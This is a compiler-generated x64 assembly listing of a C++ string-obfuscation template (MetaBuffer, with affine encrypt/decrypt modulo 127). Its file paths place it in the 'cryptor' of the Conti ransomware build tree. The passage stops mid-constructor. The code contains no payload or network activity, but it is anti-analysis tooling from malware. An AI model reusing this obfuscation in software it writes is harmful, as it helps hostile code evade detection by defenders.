??0?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 17	 sub	 eax, 23
  0002d	6b c0 0f	 imul	 eax, eax, 15
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 11	 imul	 eax, eax, 17
  0002d	83 c0 17	 add	 eax, 23
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 2a	 cmp	 QWORD PTR i$1[rbp], 42	; 0000002aH
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv392 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
